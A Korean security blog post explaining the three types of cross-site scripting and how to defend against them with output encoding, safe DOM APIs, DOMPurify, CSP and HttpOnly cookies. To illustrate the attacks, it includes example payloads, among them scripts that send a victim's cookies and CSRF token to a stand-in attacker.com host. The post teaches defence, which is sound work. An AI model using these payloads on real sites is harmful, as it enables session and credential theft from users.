---
title: "XSS 완전 정복: 크로스 사이트 스크립팅 개요"
description: "XSS(Cross-Site Scripting)의 세 가지 유형(Reflected·Stored·DOM-based)을 분류하고, 공격 영향과 출력 인코딩·CSP·HttpOnly 쿠키·DOMPurify로 구성된 다층 방어 전략을 Python/JavaScript 코드와 함께 다룹니다."
author: "PALDYN Team"
pubDate: "2026-06-03"
archiveOrder: 10
type: "knowledge"
category: "Security"
tags: ["XSS", "크로스사이트스크립팅", "CSP", "DOMPurify", "출력인코딩", "OWASP"]
featured: false
draft: false
---

[지난 글](/posts/websec-template-injection/)에서 서버 사이드 템플릿 엔진에서 코드를 실행하는 SSTI를 다뤘다. 이번 글에서는 인젝션 계열의 마지막이자 웹에서 가장 광범위하게 발생하는 **XSS(Cross-Site Scripting)**를 개관한다. XSS는 OWASP Top 10의 A03 인젝션 카테고리에 포함되며, 공격이 성공하면 피해자의 브라우저에서 임의의 JavaScript를 실행할 수 있다.

## XSS란

XSS는 공격자가 악성 스크립트를 웹 페이지에 삽입해, 해당 페이지를 방문한 다른 사용자의 브라우저에서 스크립트가 실행되는 취약점이다. 서버를 공격하는 것이 아니라 **서버를 매개로 피해자의 브라우저를 공격**한다는 점이 특징이다.

```javascript
// XSS로 실행 가능한 공격의 예
document.location = 'https://attacker.com/steal?c=' + document.cookie;
// 세션 쿠키가 공격자 서버로 전송된다
```

## XSS 세 가지 유형

![XSS 유형 비교](/assets/posts/websec-xss-overview-types.svg)

### Reflected XSS (반사형)

악성 스크립트가 URL 파라미터 등 HTTP 요청에 포함되어 서버 응답에 그대로 반사된다. 서버에 저장되지 않으므로, 공격자가 악성 URL을 피해자에게 클릭하도록 유도해야 한다.

```
공격 URL: https://example.com/search?q=<script>stealCookie()</script>
서버 응답: <p>검색 결과: <script>stealCookie()</script></p>
          ↑ 입력을 이스케이프 없이 HTML에 삽입
```

피싱 이메일, 단축 URL, 소셜 엔지니어링으로 전파된다.

### Stored XSS (저장형)

악성 스크립트가 데이터베이스에 저장되어 페이지를 방문하는 모든 사용자에게 실행된다. 게시판 댓글, 사용자 프로필, 채팅 메시지가 대표적인 벡터다.

```html
<!-- 게시판 댓글로 저장된 XSS -->
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookie: document.cookie,
      token: document.querySelector('input[name=csrf]').value,
      url: location.href
    })
  });
</script>
```

한 번 저장하면 삭제 전까지 모든 방문자에게 실행된다. 가장 위험한 유형이다.

### DOM-based XSS

서버를 거치지 않고 클라이언트 사이드 JavaScript가 DOM을 조작할 때 발생한다. URL 해시(#), `window.name`, `document.referrer` 같은 소스에서 데이터를 읽어 `innerHTML` 같은 위험한 싱크에 쓴다.

```javascript
// 취약한 클라이언트 코드
const search = new URLSearchParams(location.search).get('q');
document.getElementById('result').innerHTML = '검색: ' + search;
// ?q=<img src=x onerror=alert(1)> → XSS

// 서버 응답에는 스크립트가 없으므로 서버 필터·WAF 우회 가능
```

## XSS 공격 영향

XSS는 JavaScript로 할 수 있는 모든 것을 피해자의 세션으로 할 수 있다.

| 공격 | 설명 |
|---|---|
| 세션 탈취 | `document.cookie`로 쿠키 탈취 후 계정 도용 |
| 키로깅 | 입력 이벤트를 리스닝해 비밀번호·신용카드 탈취 |
| 가짜 UI | DOM을 조작해 피싱 로그인 폼 삽입 |
| 내부 네트워크 스캔 | XMLHttpRequest로 내부망 접근 (XSS-to-SSRF) |
| CSRF 토큰 탈취 | 토큰을 읽어 CSRF 방어 우회 |
| 웜 전파 | Stored XSS에서 방문자를 자동으로 감염 (MySpace Samy 웜) |

## 방어 전략

![XSS 방어 코드](/assets/posts/websec-xss-overview-defense.svg)

### 1. 출력 인코딩 (가장 중요)

HTML 컨텍스트에 사용자 데이터를 출력할 때 반드시 HTML 엔티티로 인코딩한다.

```python
# Python / Flask + Jinja2 — 자동 이스케이프 활성화
from flask import Flask
from jinja2 import select_autoescape

app = Flask(__name__)
app.jinja_env.autoescape = select_autoescape(['html', 'xml'])

# 템플릿에서 {{ user_input }}은 자동으로 &lt;script&gt;가 됨
# 원시 HTML이 필요할 때만 {{ user_input | safe }} 사용 (신중하게!)
```

컨텍스트별 인코딩이 다르다. HTML 속성, URL, JavaScript, CSS에 들어갈 때 각각 다른 방식으로 인코딩해야 한다.

```python
from markupsafe import escape
import urllib.parse

# HTML 본문
html_safe = escape(user_input)  # < > & " '

# URL 파라미터
url_safe = urllib.parse.quote(user_input)

# JavaScript 문자열 (JSON 직렬화 사용)
import json
js_safe = json.dumps(user_input)  # 문자열이면 따옴표 포함
```

### 2. DOM 안전 API 사용

```javascript
// innerHTML 대신 textContent
// ❌ XSS 위험
element.innerHTML = userInput;

// ✅ 텍스트만 출력
element.textContent = userInput;

// ✅ 안전한 DOM 생성
const node = document.createTextNode(userInput);
container.appendChild(node);

// HTML이 필요하면 DOMPurify 사용
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(richTextHtml, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
});
element.innerHTML = clean;
```

### 3. Content Security Policy (CSP)

CSP 헤더로 스크립트 실행 소스를 제한한다. XSS가 성공해도 공격자 서버로 데이터 전송을 차단할 수 있다.

```python
# Flask 예시
@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' 'nonce-{nonce}'; "  # 인라인 스크립트에 nonce
        "style-src 'self' 'unsafe-inline'; "
        "connect-src 'self'; "
        "img-src 'self' data:; "
        "object-src 'none'; "
        "base-uri 'self'; "
        "frame-ancestors 'none'"
    )
    return response
```

### 4. HttpOnly + Secure 쿠키

세션 쿠키에 `HttpOnly` 플래그를 설정해 JavaScript에서 접근 불가하게 한다.

```python
# XSS가 성공해도 document.cookie로 세션 쿠키를 읽을 수 없음
response.set_cookie(
    'session_id', session_token,
    httponly=True,   # JS 접근 차단
    secure=True,     # HTTPS에서만 전송
    samesite='Strict'
)
```

## 취약한 패턴 체크리스트

다음 패턴이 코드에 있다면 XSS를 검토해야 한다.

```javascript
// JS 위험 패턴
el.innerHTML = ...          // Stored/Reflected/DOM XSS
document.write(...)         // 오래된 위험 패턴
eval(userInput)             // 코드 실행
setTimeout(userInput, 0)    // 문자열 실행

// 위험한 Source (입력 소스)
location.hash
location.search
document.referrer
window.name
postMessage 이벤트 데이터
```

XSS 방어의 핵심은 **출력 컨텍스트에 맞는 인코딩 + DOM 안전 API + CSP**의 삼중 방어다. 어느 하나만으로는 완전하지 않다. 다음 글부터는 XSS 세 가지 유형을 각각 심화 탐구한다.

---

**지난 글:** [템플릿 인젝션(SSTI): 서버 사이드 코드 실행 취약점](/posts/websec-template-injection/)

<br>
읽어주셔서 감사합니다. 😊
